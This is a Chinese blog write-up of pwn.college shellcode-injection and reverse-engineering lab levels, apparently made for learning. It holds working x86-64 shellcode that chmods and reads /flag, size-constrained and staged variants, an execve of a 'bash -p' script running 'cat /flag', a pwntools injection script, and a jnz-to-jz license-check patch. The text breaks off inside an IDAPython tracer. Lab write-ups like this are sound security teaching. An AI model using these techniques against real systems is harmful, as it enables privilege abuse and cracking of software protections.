<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">	#chmod<br>	mov rax, 90<br>	lea rdi, [rip+flag]<br>	mov rsi, 4 #other users can read the flag<br>	syscall<br><br>	#open<br>	xor rsi, rsi<br>	lea rdi, [rip+flag]<br>	xor rax, rax<br>	mov al, 2<br>	syscall<br><br>	#read<br>	mov rdi, rax<br>	mov rsi, rsp<br>	xor rdx, rdx<br>	mov dl, 100<br>	xor rax, rax<br>	syscall<br>	<br>	#write<br>	xor rdi, rdi<br>	mov dil, 1<br>	mov rsi, rsp<br>	mov rdx, rax<br>	xor rax, rax<br>	mov al, 1<br>	syscall<br>	<br>	#exit<br>	xor rax, rax<br>	mov al, 60<br>	xor rdi, rdi<br>	mov dil, 42<br>	syscall<br><br>flag:<br>	.ascii &quot;/flag&quot;<br></code></pre></td></tr></table></figure>
<p>​	使用二进制编译之后执行，就可以直接得到flag了。感觉这里用户本身就有权限，更像是运行程序之后，给予了 <code>chmod</code> suid的权限，然后才能使得调用这个可以提权。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@shellcode-injection~level7:~$ ./d.elf <br>pwn.college&#123;Il5WBRfDSBTM94eNhylPYA9USRm.01MyIDL0cDMzQzW&#125;<br>hacker@shellcode-injection~level7:~$ strace ./d.elf <br>execve(&quot;./d.elf&quot;, [&quot;./d.elf&quot;], 0x7ffe48cf0930 /* 24 vars */) = 0<br>chmod(&quot;/flag&quot;, 004)                     = -1 EPERM (Operation not permitted)<br>open(&quot;/flag&quot;, O_RDONLY)                 = 3<br>read(3, &quot;pwn.college&#123;Il5WBRfDSBTM94eNhylP&quot;..., 100) = 57<br>write(1, &quot;pwn.college&#123;Il5WBRfDSBTM94eNhylP&quot;..., 57pwn.college&#123;Il5WBRfDSBTM94eNhylPYA9USRm.01MyIDL0cDMzQzW&#125;<br>) = 57<br>exit(42)                                = ?<br>+++ exited with 42 +++<br>hacker@shellcode-injection~level7:~$ ls -al /flag<br>-------r-- 1 root root 57 Feb  8 03:19 /flag  # 这里之后也能看出/flag文件被设置了权限<br></code></pre></td></tr></table></figure>
<h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2>
<blockquote>
<p>只能用0x12byte，这里利用chmod的特性</p>
</blockquote>
<p>​	linux软链接和chmod有一个特点，chmod在对软链接(也就是链接文件)进行操作时，并不是直接作用于软链接(也就是链接文件)，而是直接作用于它所指向的文件(也就是真正的文件)。就像我们将我的 home/hacker 目录中的 f 文件链接到 /flag 并且我们 chmod f 文件而不是 /flag 文件一样，如果我们成功更改 f 文件的权限，我们就成功更改 /flag 文件的权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s /flag f # 在当前目录创建软链接<br></code></pre></td></tr></table></figure>
<p>​	下面就是shellcode，总共12个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">6a 66		push 0x66		# 压入&quot;f&quot;<br>48 89 e7    mov rdi,rsp		<br>6a 04    	push 4			# 4-&gt;010其他用户读权限<br>5e    		pop rsi			# 这里 mov sil,4 也是3个字节<br>b0 5a    	mov al,0x5a		# 这里只需要两个字节,与sil相比应该是常用寄存器的指令有简化<br>0f 05    	syscall<br></code></pre></td></tr></table></figure>
<h2 id="level-9"><a class="markdownIt-Anchor" href="#level-9"></a> level 9</h2>
<blockquote>
<p>每10个字节之后会被覆盖10个int3，在适当位置填充无用字节即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">	push 0x66<br>    mov rdi,rsp<br>    push 4<br>    pop rsi<br>    jmp next    	# eb 0a，与level8结合，算上这两个刚好10byte<br>.rept 10<br>    nop 			# 这里就被覆盖了10字节的int 3(0xcc)<br>.endr<br>next:<br>    mov al,0x5a<br>    syscall<br></code></pre></td></tr></table></figure>
<h2 id="level-10-11"><a class="markdownIt-Anchor" href="#level-10-11"></a> level 10-11</h2>
<blockquote>
<p>level 10的前面8个字节采用冒泡排序，直接rept填充就行，然后依旧是chmod代码。11添加了关闭stdin，stdout和stderr，步过对于chmod无影响，依旧套用</p>
</blockquote>
<h2 id="level-12"><a class="markdownIt-Anchor" href="#level-12"></a> level 12</h2>
<blockquote>
<p>要求每个字节都不一样</p>
</blockquote>
<p>​	这里脚本得改一改，有两个<code>push</code>，所以需要修改一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">6a 66		push 0x66<br>48 89 e7    mov rdi,rsp<br>40 b6 04    mov sil,4			# 用到了mov sil,4 与push pop一样的字节数<br>b0 5a      	mov al,0x5a<br>0f 05     	syscall<br></code></pre></td></tr></table></figure>
<h2 id="level-13"><a class="markdownIt-Anchor" href="#level-13"></a> level 13</h2>
<blockquote>
<p>只读 0xc(12) byte 的数据，上面的shellcode刚好是12字节，直接套用</p>
</blockquote>
<p>​	出了直接套用上一个shellcode，这里还可以扩充一下，使用<code>execve</code>来执行一下另外的程序来达到目的</p>
<ul>
<li>
<p>创建文件 <code>a</code> ，然后写入数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash -p</span><br><span class="hljs-built_in">id</span><br><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>之后更改汇编。其中 <code>cdq</code> 将eax的最高位即第31位赋值给edx的每一位，这个指令一般是在32位系统中除法前使用的，就是让edx作为eax的高位组合成64位的数字，让符号统一，它只有一个字节，替换<code>xor edx,edx</code>。这里总共12字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">6a 66		push 0x61			# 0x61 -&gt; a，这是文件的名称<br>48 89 e7    mov rdi, rsp<br>31 f6    	xor esi, esi<br>99 	   		cdq					 <br>b0 3b    	mov al,0x3b			# 0x3b -&gt; execve<br>0f 05    	syscall<br></code></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="level-14"><a class="markdownIt-Anchor" href="#level-14"></a> level 14</h2>
<blockquote>
<p>这次就是只要 0x6 字节数据了</p>
</blockquote>
<p>​	gdb调试一下程序 <code>run &lt; d.bin</code> 写入shellcode进行调试。这里刚好在运行 <code>shellcode</code> 之前，<code>rax = 0, rdx = 0x1a009000</code>(这个就是一开始读shellcode的地址)，所以可以再构造一个read，再从<code>0</code> 中读取一个新的shellcode来执行。</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402081619678.png" srcset="/img/loading.gif" lazyload alt="image-20240208161928503" /></p>
<p>​	这里就是 rax(syscall code) = 0，rdx = 0x1a009000(自定义shellcode的起始内存地址)，所以之后需要设置 rdi = 0(fd)，rsi=rdx(char *buf)便可以从输入读取shellcode并在下一步执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor edi,edi<br>mov esi,edx<br>syscall<br></code></pre></td></tr></table></figure>
<p>​	然后设置再次读取的shellcode，这里因为上面是6个字节，所以这里shellcode的起始位置是 0x1a009000 + 6(即rip从新的shellcode的6字节之后开始运行的)，所以之前填充一些nop</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.rept</span> <span class="hljs-number">0x20</span><br>	<span class="hljs-keyword">nop</span><br><span class="hljs-meta">.endr</span><br>	<span class="hljs-keyword">push</span> <span class="hljs-number">0x66</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">sil</span>,<span class="hljs-number">4</span>		<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>
<p>​	使用pwntools可以成功，不知道为什么二进制编译过不去。但是二者是一样的，估计得把上面两个放在一起编译才可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9][0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode1 = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor edi, edi</span><br><span class="hljs-string">    mov esi,edx</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload1 = asm(shellcode1)<br>shellcode2 = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">.rept 0x20</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">.endr</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov sil,4		</span><br><span class="hljs-string">    mov al,0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload2 = asm(shellcode2)<br>r.send(payload1+payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="reverse-engineering"><a class="markdownIt-Anchor" href="#reverse-engineering"></a> Reverse Engineering</h1>
<blockquote>
<p>这里 <code>*.0</code> 会给提示，然后 <code>*.1</code> 没有提示，需要分析</p>
</blockquote>
<h2 id="基础知识-2"><a class="markdownIt-Anchor" href="#基础知识-2"></a> 基础知识</h2>
<h3 id="静态逆向"><a class="markdownIt-Anchor" href="#静态逆向"></a> 静态逆向</h3>
<ul>
<li>gcc参数
<ul>
<li><code>-static</code>：该选项用于生成静态链接的可执行文件。静态链接意味着所有的库都会被链接到可执行文件中，使得生成的可执行文件不依赖于系统中的动态库。这样的可执行文件在不同的系统上可以直接运行，但可能会占用更多的磁盘空间，并且不能享受系统级别的更新和优化。</li>
<li><code>-static-pie</code>：该选项生成的是静态链接的<strong>位置无关可执行文件</strong>。与普通的静态链接不同，位置无关的可执行文件可以在内存中的任何位置执行，而不需要重定位。这使得生成的可执行文件在安全性方面更有优势，因为它们难以受到某些攻击(如ROP攻击)的影响。同时，它们也不依赖于系统中的动态库。但是，与普通的静态链接相比，位置无关的静态链接可能会导致稍微增加一些执行开销。</li>
</ul>
</li>
</ul>
<h3 id="动态逆向"><a class="markdownIt-Anchor" href="#动态逆向"></a> 动态逆向</h3>
<ul>
<li>ltrace,strace
<ul>
<li>ltrace traces library calls</li>
<li>strace traces system calls</li>
</ul>
</li>
</ul>
<h2 id="level-1-6"><a class="markdownIt-Anchor" href="#level-1-6"></a> level 1-6</h2>
<p>​	strings可以解决大部分问题，后面就是看要求了</p>
<h2 id="level-7-8"><a class="markdownIt-Anchor" href="#level-7-8"></a> level 7-8</h2>
<p>​	题目不难，主要是对于它 <code>奇偶异或-&gt;交换-&gt;排序</code> 这一流程的理解。这里是对数据处理好的，否则这三步下来很可能只能爆破处理了，由此这里的交换和排序都不用处理了，因为数据是经过处理的，这两步必须互为逆操作才能保证可以逆向出来。所以只用对提取出的最终数据进行<code>异或操作</code>即可。</p>
<h2 id="level-9-11"><a class="markdownIt-Anchor" href="#level-9-11"></a> level 9-11</h2>
<blockquote>
<p>考察 patch 的能力，有可能不止一处需要 patch</p>
</blockquote>
<p>​	主要点就是下面这个，这里 <code>v12</code> 为程序的基址，一开始输入的 <code>v5</code> 就是距离基址的偏移，<code>v4</code> 就是将要 patch 的数据。这里将偏移为</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082140008.png" srcset="/img/loading.gif" lazyload alt="image-20240208214047925" /></p>
<p>​	这里将偏移为 <code>0x225B</code> 的地方 patch 为 <code>0x74</code> 即可。就是将判断license正确的判断从 jnz 改为 jz，这样就可以直接通过了。</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082142629.png" srcset="/img/loading.gif" lazyload alt="image-20240208214205586" /></p>
<p>​</p>
<blockquote>
<p>对于11.1，需要注意长跳转和短跳转的问题，修改正确的机器码</p>
</blockquote>
<ul>
<li>
<p>对于短跳转(short jump)，跳转范围通常是-128到+127字节，也就是在一个字节内可以表示的范围。在这种情况下，<code>jnz</code>的机器码是<code>75</code>，后跟着一个字节的相对地址(偏移量)。</p>
</li>
<li>
<p>对于长跳转(near jump)，跳转范围更大，可以跳转到任意位置。在这种情况下，<code>jnz</code>的机器码是<code>0F 85</code>，后跟着一个32位相对地址(偏移量)，以支持更大范围的跳转目标。</p>
</li>
<li>
<p>长跳转</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082154339.png" srcset="/img/loading.gif" lazyload alt="image-20240208215454267" /></p>
</li>
<li>
<p>短跳转</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082156633.png" srcset="/img/loading.gif" lazyload alt="image-20240208215611592" /></p>
</li>
</ul>
<h2 id="level-12-18"><a class="markdownIt-Anchor" href="#level-12-18"></a> level 12-18</h2>
<blockquote>
<p>还是很简单的vm题，只要分清楚每个模拟指令在做什么就可以了。得到答案直接发送bytes类型即可</p>
</blockquote>
<h2 id="level-19"><a class="markdownIt-Anchor" href="#level-19"></a> level 19</h2>
<blockquote>
<p>主要是搞清楚长度的限制，即明白跳转条件</p>
</blockquote>
<p>​	read提示的长度和真实比较的长度不匹配，卡了很久，需要手动计算数据比对位置来看接收数据的长度(长度限制可以参考下面对于19.1的分析)。对于19.1，仿照19.0的形式写一个反编译器进行分析，这里使用 idapython 来进行指令的打印。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idc_bc695 <span class="hljs-keyword">import</span> GetRegValue, Byte<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_reg</span>(<span class="hljs-params">regs</span>):<br>    <span class="hljs-keyword">match</span> regs:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;a&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;b&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;c&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;d&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;None&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_flags</span>(<span class="hljs-params">a1</span>):<br>    flag_description = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;L&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">1</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;G&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;E&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;N&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">0x10</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;Z&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a1:<br>        flag_description += <span class="hljs-string">&#x27;*&#x27;</span><br>    <span class="hljs-keyword">return</span> flag_description<br><br><span class="hljs-comment"># call ins 那里下断点，做条件断点</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># func_name = GetFunctionName(0x0000555555555A76)  # GetFunctionName() -&gt; idc.get_func_name()</span><br>    rdi = GetRegValue(<span class="hljs-string">&quot;rdi&quot;</span>)<br>    arg1 = rdi<br>    info_reg = <span class="hljs-string">&quot;[V] a:0x&#123;:02x&#125; b:0x&#123;:02x&#125; c:0x&#123;:02x&#125; d:0x&#123;:02x&#125; s:0x&#123;:02x&#125; i:0x&#123;:02x&#125; f:0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<br>        Byte(arg1 + <span class="hljs-number">0x400</span>),<br>        Byte(arg1 + <span class="hljs-number">0x401</span>),<br>        Byte(arg1 + <span class="hljs-number">0x402</span>),<br>        Byte(arg1 + <span class="hljs-number">0x403</span>),<br>        Byte(arg1 + <span class="hljs-number">0x404</span>),<br>        Byte(arg1 + <span class="hljs-number">0x405</span>),<br>        Byte(arg1 + <span class="hljs-number">0x406</span>)) <span class="hljs-comment"># 0x404 -&gt; s为栈指针</span><br>    <span class="hljs-built_in">print</span>(info_reg)<br>    rsi = GetRegValue(<span class="hljs-string">&quot;rsi&quot;</span>)<br>    arg2 = rsi &amp; <span class="hljs-number">0xff</span>           <span class="hljs-comment"># 0x010804 里的低8位 0x04</span><br>    arg1 = (rsi &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>    <span class="hljs-comment"># 0x010804 里的中间8位 0x08</span><br>    op = (rsi &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>     <span class="hljs-comment"># 0x010804 里的高8位 0x01</span><br>    info_op = <span class="hljs-string">&quot;[I] op:0x&#123;:02x&#125;  arg1:0x&#123;:02x&#125;  arg2:0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(op, arg1, arg2)<br>    <span class="hljs-built_in">print</span>(info_op)<br>    <br>    <span class="hljs-comment"># 之后就是各个函数了</span><br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># imm</span><br>        imm = <span class="hljs-string">&quot;[s] IMM &#123;:s&#125; = 0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), arg2)<br>        <span class="hljs-built_in">print</span>(imm)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># add</span><br>        add = <span class="hljs-string">&quot;[s] ADD &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(add)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># stk</span><br>        stk = <span class="hljs-string">&quot;[s] STK &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(stk)<br>        <span class="hljs-keyword">if</span> arg2 != <span class="hljs-number">0</span>:<br>            push = <span class="hljs-string">&quot;[s] ... push &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg2))<br>            <span class="hljs-built_in">print</span>(push)<br>        <span class="hljs-keyword">if</span> arg1 != <span class="hljs-number">0</span>:<br>            pop = <span class="hljs-string">&quot;[s] ... pop &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1))<br>            <span class="hljs-built_in">print</span>(pop)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x20</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># stm</span><br>        stm = <span class="hljs-string">&quot;[s] STM *&#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(stm)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># idm</span><br>        ldm = <span class="hljs-string">&quot;[s] LDM &#123;:s&#125; *&#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(ldm)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># cmp</span><br>        cmp = <span class="hljs-string">&quot;[s] CMP &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(cmp)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x10</span> ) != <span class="hljs-number">0</span>: <span class="hljs-comment"># jmp</span><br>        jmp = <span class="hljs-string">&quot;[s] JMP &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_flags(arg2), des_reg(arg1))<br>        <span class="hljs-built_in">print</span>(jmp)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arg1 <span class="hljs-keyword">or</span> arg1 &amp; Byte(arg1+<span class="hljs-number">0x406</span>) != <span class="hljs-number">0</span>:<br>            jmp_true = <span class="hljs-string">&quot;    [j] ... TAKEN&quot;</span><br>            <span class="hljs-built_in">print</span>(jmp_true)<br>        <span class="hljs-keyword">else</span>:<br>            jmp_false = <span class="hljs-string">&quot;    [j] ... NOT TAKEN&quot;</span><br>            <span class="hljs-built_in">print</span>(jmp_false)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x80</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># sys</span><br>        sys = <span class="hljs-string">&quot;[s] SYS 0x&#123;:02x&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(arg2, des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(sys)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">1</span> != <span class="hljs-number">0</span>:<br>            sys_open = <span class="hljs-string">&quot;    [s] ... open&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_open)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>            sys_read = <span class="hljs-string">&quot;    [s] ... read code&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_read)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">0x20</span> != <span class="hljs-number">0</span>:<br>            sys_read_memory = <span class="hljs-string">&quot;    [s] ... read_memory&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_read_memory)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">0x10</span> != <span class="hljs-number">0</span>:<br>            sys_write = <span class="hljs-string">&quot;    [s] ... write&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_write)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:<br>            sys_sleep = <span class="hljs-string">&quot;    [s] ... sleep&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_sleep)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            sys_exit = <span class="hljs-string">&quot;    [s] ... exit&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_exit)<br>        <span class="hljs-keyword">if</span> arg1:<br>            return_info = <span class="hljs-string">&quot;    [s] ... return value (in register &#123;:s&#125;): not 